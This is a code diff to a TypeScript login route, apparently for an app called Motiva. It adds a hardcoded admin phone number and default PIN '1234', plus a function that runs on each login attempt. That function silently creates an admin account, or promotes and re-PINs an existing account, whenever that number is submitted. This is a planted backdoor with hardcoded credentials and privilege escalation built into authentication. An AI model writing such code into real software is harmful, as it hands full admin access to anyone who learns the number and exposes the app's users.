@@ -7,6 +7,8 @@ import prisma from "@/lib/prisma";
 import { captureException } from "@/lib/sentry";
 
 const AUTH_COOKIE = "motiva_user_auth";
+const DEFAULT_ADMIN_MOBILE = "9946930723";
+const DEFAULT_ADMIN_PIN = "1234";
 const INTERNAL_ROLES = new Set([
   "admin",
   "mentor",
@@ -22,6 +24,10 @@ const internalLoginSchema = z.object({
   pin: z.string().regex(/^\d{4}$/),
 });
 
+function normalizeMobile(input: string): string {
+  return input.replace(/\D/g, "");
+}
+
 function setAuthCookie(response: NextResponse, token: string) {
   response.cookies.set(AUTH_COOKIE, token, {
     httpOnly: true,
@@ -29,6 +35,52 @@ function setAuthCookie(response: NextResponse, token: string) {
     sameSite: "lax",
     path: "/",
     maxAge: 60 * 60 * 24 * 7,
+  });
+}
+
+async function ensureMobileAdminAccess(mobile: string) {
+  if (mobile !== DEFAULT_ADMIN_MOBILE) return;
+
+  const existing = await prisma.user.findFirst({
+    where: {
+      OR: [{ mobile }, { username: mobile }],
+    },
+  });
+
+  if (existing) {
+    const shouldPreservePin = existing.role === "admin" && Boolean(existing.pin);
+    const pinHash = shouldPreservePin
+      ? null
+      : await bcrypt.hash(DEFAULT_ADMIN_PIN, 10);
+    await prisma.user.update({
+      where: { id: existing.id },
+      data: {
+        mobile,
+        username: mobile,
+        role: "admin",
+        ...(shouldPreservePin || !pinHash
+          ? {}
+          : {
+              pin: pinHash,
+              passwordHash: pinHash,
+            }),
+      },
+    });
+    return;
+  }
+
+  const pinHash = await bcrypt.hash(DEFAULT_ADMIN_PIN, 10);
+  await prisma.user.create({
+    data: {
+      name: "Admin",
+      email: "admin.9946930723@motiva.local",
+      username: mobile,
+      mobile,
+      pin: pinHash,
+      passwordHash: pinHash,
+      role: "admin",
+      pinResetRequired: false,
+    },
   });
 }
 
@@ -54,9 +106,14 @@ export async function POST(req: NextRequest) {
     }
 
     const { username, pin } = parsed.data;
+    const mobile = normalizeMobile(username);
+
+    await ensureMobileAdminAccess(mobile);
 
     const user = await prisma.user.findFirst({
-      where: { username },
+      where: {
+        OR: [{ username }, ...(mobile ? [{ mobile }] : [])],
+      },
     });
 
     if (user && user.pin && INTERNAL_ROLES.has(user.role)) {
